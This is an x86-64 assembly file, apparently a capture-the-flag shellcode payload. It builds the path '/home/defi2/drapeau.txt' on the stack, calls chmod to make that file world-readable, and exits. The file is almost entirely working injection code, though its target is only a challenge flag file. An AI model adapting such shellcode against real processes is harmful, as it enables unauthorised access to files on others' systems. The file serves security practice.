; yasm -f elf64 defi2.S -o defi2.o

global _start
section .text
_start:

	add	rax, 0x10
	jmp	rax

	times (0x10 + _start - $) db 0xcc

stage2:

	xor	rdx, rdx

	xor	rsi, rsi
	mov	si, 0x124

	mov	rbx, 0x7478742e756165ff
	shr	rbx, 8
	push	rbx

	mov	rbx, 0x706172642f326966
	push	rbx

	mov	rbx, 0x65642f656d6f682f
	push	rbx

	mov	rdi, rsp
	xor	rax, rax
	mov	al, 0x5a

	syscall

	xor	rdi, rdi
	xor	rax, rax
	mov	al, 0x3c

	syscall
